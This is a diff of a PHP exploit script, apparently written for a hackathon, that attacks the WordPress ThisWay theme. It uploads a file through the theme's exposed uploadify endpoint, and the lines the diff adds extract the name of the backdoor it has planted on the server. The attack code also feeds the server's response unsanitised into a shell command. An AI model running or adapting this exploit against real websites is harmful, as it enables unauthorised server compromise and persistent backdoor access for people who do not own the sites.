@@ -1,7 +1,7 @@
 
 <?php
 system("clear");
-echo "Wordpress Exploiting via third party plugin ThisWay Template\n";
+echo "Wordpress Exploiting via third party plugin ThisWay theme\n";
 echo "\033[01;31m                  IT-Solunium for Hackathon                  \033[0m\n";
 echo "------------------------------------------------------------\n";
 echo "\n";
@@ -21,11 +21,12 @@ if ( !isset($argv[1]) or !isset($argv[2]) )
 
 	$ch = curl_init("http://$url_website_vul_racine/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php");
 
-		/* For debugging
-		echo("http://$url_website_vul_racine/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php");
+		/* For debugging */
+		echo("Url to attack -> http://$url_website_vul_racine/wp-content/themes/ThisWay/includes/uploadify/upload_settings_image.php\n");
 		echo ("\n");
-		echo($uploadfile);
-		*/
+		echo("Uploading file : $uploadfile");
+		echo ("\n");
+		/**/
 
 	curl_setopt($ch, CURLOPT_POST, true); 
 	curl_setopt($ch, CURLOPT_POSTFIELDS,
@@ -33,6 +34,12 @@ if ( !isset($argv[1]) or !isset($argv[2]) )
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 	$postResult = curl_exec($ch);
 	curl_close($ch);
-	print "$postResult";
-	
+	/*echo "$postResult";*/
+	echo ("\n");
+	echo ("Le nom du backdoor généré sur le serveur est :\n");
+        $query = "echo $postResult | grep -o settingsimage_[A-Za-z0-9]*.php | uniq -d";
+	System ($query);
+
+
+		
 ?>
